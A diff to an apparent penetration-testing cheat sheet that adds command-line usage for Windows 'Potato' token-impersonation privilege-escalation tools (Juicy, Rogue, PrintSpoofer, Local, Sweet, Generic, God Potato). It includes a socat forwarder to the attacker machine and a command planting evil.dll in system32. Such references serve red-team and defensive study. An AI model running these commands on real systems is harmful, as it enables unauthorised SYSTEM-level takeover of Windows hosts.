@@ -382,8 +382,51 @@ oLink.Save
 <p>Launch an <strong>Hot Potato</strong> attack from a low privileged user (binary <a href="https://github.com/foxglovesec/Potato/tree/master/source/Potato/Potato/bin/Release">here</a>):</p>
 <div class="highlight"><pre><span></span><code>.<span class="se">\p</span>otato.exe<span class="w"> </span>-ip<span class="w"> </span>&lt;target<span class="w"> </span>ip&gt;<span class="w"> </span>-cmd<span class="w"> </span><span class="s2">"&lt;command to execute&gt;"</span><span class="w"> </span>-enable_httpserver<span class="w"> </span><span class="nb">true</span><span class="w"> </span>-enable_defender<span class="w"> </span><span class="nb">true</span><span class="w"> </span>-enable_spoof<span class="w"> </span><span class="nb">true</span><span class="w"> </span>-enable_exhaust<span class="w"> </span><span class="nb">true</span>
 </code></pre></div>
-<p>Launch a Rotten Potato attack from a service account meterpreter shell with <em>incognito mode</em> enabled (binary <a href="https://github.com/breenmachine/RottenPotatoNG">here</a>):</p>
-<div class="highlight"><pre><span></span><code>MSFRottenPotato.exe<span class="w"> </span>t<span class="w"> </span>&lt;executable<span class="w"> </span>to<span class="w"> </span>run&gt;
+<p>Launch a <strong>Rotten Potato</strong> attack from a account with token impersonation privileges <code>meterpreter</code> shell with <em>incognito mode</em> enabled (binary <a href="https://github.com/breenmachine/RottenPotatoNG">here</a>):</p>
+<div class="highlight"><pre><span></span><code>.<span class="se">\M</span>SFRottenPotato.exe<span class="w"> </span>t<span class="w"> </span>&lt;executable<span class="w"> </span>to<span class="w"> </span>run&gt;
+</code></pre></div>
+<p>Launch a Juicy Potato attack from a service account shell (binary <a href="https://github.com/ohpe/juicy-potato/tree/master">here</a>):</p>
+<div class="highlight"><pre><span></span><code>.<span class="se">\J</span>uicyPotato.exe<span class="w"> </span>-l<span class="w"> </span><span class="m">1337</span><span class="w"> </span>-p<span class="w"> </span>&lt;executable<span class="w"> </span>to<span class="w"> </span>run<span class="w"> </span>-<span class="w"> </span>absolute<span class="w"> </span>path&gt;<span class="w"> </span>-t<span class="w"> </span>*<span class="w"> </span>-c<span class="w"> </span>&lt;CLSDID&gt;
+</code></pre></div>
+<p>where <code>CLSID</code> can be one from <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">this list</a> or one from the <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1">GetCLSID.ps1</a> script.</p>
+<p>Launch a <strong>Rogue Potato</strong> attack; first start a socat listener forwarding port <code>135</code> on the attacker machine to a victim host unused port, for example <code>9999</code>:</p>
+<div class="highlight"><pre><span></span><code>socat<span class="w"> </span>tcp-listen:135,reuseaddr,fork<span class="w"> </span>tcp:&lt;victim<span class="w"> </span>ip&gt;:9999
+</code></pre></div>
+<p>Run the exploit from an account with token impersonation privileges shell (binary <a href="https://github.com/antonioCoco/RoguePotato">here</a>):</p>
+<div class="highlight"><pre><span></span><code>.<span class="se">\R</span>oguePotato.exe<span class="w"> </span>-r<span class="w"> </span>&lt;attacker<span class="w"> </span>ip&gt;<span class="w"> </span>-e<span class="w"> </span><span class="s2">"&lt;command to execute&gt;"</span><span class="w"> </span>-l<span class="w"> </span><span class="m">9999</span>
+</code></pre></div>
+<p>Run a <strong>Print Spoofer</strong> attack from an account with token impersonation privileges shell (binary <a href="https://github.com/itm4n/PrintSpoofer">here</a>):</p>
+<div class="highlight"><pre><span></span><code>.<span class="se">\P</span>rintSpoofer.exe<span class="w"> </span>&ndash;i<span class="w"> </span>-c<span class="w"> </span><span class="s2">"&lt;command to execute&gt;"</span>
+</code></pre></div>
+<p>Run a <strong>LocalPotato</strong> attack from an account with token impersonation privileges shell  (binary <a href="https://github.com/decoder-it/LocalPotato?tab=readme-ov-file">here</a>):</p>
+<div class="highlight"><pre><span></span><code># SMB Scenario
+LocalPotato.exe -i c:\hacker\evil.dll -o windows\system32\evil.dll
+
+# WebDAV
+LocalPotato.exe -r 127.0.0.1 -u /webdavshare/potato.local
+</code></pre></div>
+<p>Run <strong>Sweet Potato</strong> from an account with token impersonation privileges shell  (binary <a href="https://github.com/CCob/SweetPotato">here</a>):</p>
+<div class="highlight"><pre><span></span><code>.<span class="se">\S</span>weetPotato.exe<span class="w"> </span>-c<span class="w"> </span>&lt;CLSDID&gt;<span class="w"> </span>-m<span class="w"> </span>&lt;method&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;executable<span class="w"> </span>to<span class="w"> </span>run&gt;<span class="w"> </span>-a<span class="w"> </span>&lt;args<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>executable&gt;<span class="w"> </span>-e<span class="w"> </span>&lt;exploit<span class="w"> </span>mode&gt;<span class="w"> </span>-l<span class="w"> </span>&lt;COM<span class="w"> </span>listen<span class="w"> </span>port&gt;
+</code></pre></div>
+<p>where:</p>
+<ul>
+<li><code>CLSDID</code>: see Juicy Potato - default is BITS <code>{4991D34B-80A1-4291-83B6-3328366B9097}</code></li>
+<li><code>method</code>: one of <code>Auto</code>, <code>User</code>or <code>Thread</code></li>
+<li><code>exploit mode</code>: one of <code>DCOM</code>, <code>WinRM</code>, <code>EfsRpc</code> or <code>PrintSpoofer</code> (default)</li>
+<li><code>COM listen port</code>: default 6666</li>
+</ul>
+<p>Run <strong>Generic Potato</strong> from an account with token impersonation privileges shell  (binary <a href="https://github.com/micahvandeusen/GenericPotato">here</a>):</p>
+<div class="highlight"><pre><span></span><code>.<span class="se">\G</span>enericPotato.exe<span class="w"> </span>-m<span class="w"> </span>&lt;method&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;executable<span class="w"> </span>to<span class="w"> </span>run&gt;<span class="w"> </span>-a<span class="w"> </span>&lt;args<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>executable&gt;<span class="w"> </span>-e<span class="w"> </span>&lt;exploit<span class="w"> </span>mode&gt;<span class="w"> </span>-l<span class="w"> </span>&lt;HTTP<span class="w"> </span>listen<span class="w"> </span>port&gt;<span class="w"> </span>-i<span class="w"> </span>&lt;HTTP<span class="w"> </span>listen<span class="w"> </span>host&gt;
+</code></pre></div>
+<p>where:</p>
+<ul>
+<li><code>method</code>: one of <code>Auto</code>, <code>User</code>or <code>Thread</code></li>
+<li><code>exploit mode</code>: one of <code>HTTP</code> or <code>NamedPipe</code> (default)</li>
+<li><code>HTTP listen port</code>: default 8888</li>
+<li><code>HTTP listen host</code>: default 127.0.0.1</li>
+</ul>
+<p>Run a <strong>God Potato</strong> attack from an account with token impersonation privileges shell  (binary <a href="https://github.com/BeichenDream/GodPotato">here</a>):</p>
+<div class="highlight"><pre><span></span><code>.<span class="se">\G</span>odPotato<span class="w"> </span>-cmd<span class="w"> </span><span class="s2">"&lt;command to run&gt;"</span>
 </code></pre></div>
   </div>
   <div class="tag-cloud">
